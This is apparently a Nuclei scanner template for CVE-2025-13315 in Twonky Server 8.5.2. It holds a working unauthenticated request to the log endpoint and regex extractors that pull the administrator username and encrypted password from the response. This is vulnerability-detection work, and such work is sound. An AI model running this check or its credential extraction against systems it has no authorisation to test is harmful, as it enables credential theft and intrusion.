id: CVE-2025-13315

info:
  name: Twonky Server 8.5.2 on Linux and Windows - Log File Exposure
  author: pussycat0x
  severity: critical
  description: |
    Twonky Server 8.5.2 contains a broken access control vulnerability caused by bypassing web service API authentication, letting unauthenticated attackers read log files with administrator credentials, exploit requires no authentication
  remediation: |
    Restrict access to the Twonky Server web service API or implement network segmentation as the vendor has not released a fix.
  impact: |
    Unauthenticated attackers can read sensitive log files containing administrator usernames and encrypted passwords.
  reference:
    - https://www.rapid7.com/blog/post/cve-2025-13315-cve-2025-13316-critical-twonky-server-authentication-bypass-not-fixed/
  metadata:
    verified: true
    zoomeye-query: app="Twonky Server"
  tags: cve,cve2025,twonky,server,exposure,unauth

http:
  - method: GET
    path:
      - "{{BaseURL}}/nmc/rpc/log_getfile"

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains_all(body,"server_main_impl","LOG_SYSTEM:","upnp_ini_file")'
        condition: and

    extractors:
      - type: regex
        name: username
        group: 1
        part: body
        regex:
          - 'accessuser =([ a-zA-Z0-9]+)'
        internal: true

      - type: regex
        name: password
        part: body
        group: 1
        regex:
          - 'accesspwd =([ :a-zA-Z0-9]+)'
        internal: true

      - type: dsl
        dsl:
          - '"Username :"+  trim(username, "[ ]")'
          - '"EncryptedPassword :"+ trim(password, "[ ]")'
# digest: 490a004630440220494ff70413a42ab78e9a36210f4892044927d094a77971ad6b0a980eda545d7802200ded4bb2aa1506116686c2ab981828e47f1d1b60a5c1a69eb3417e85323d4f9b:922c64590222798bb761d5b6d8e72950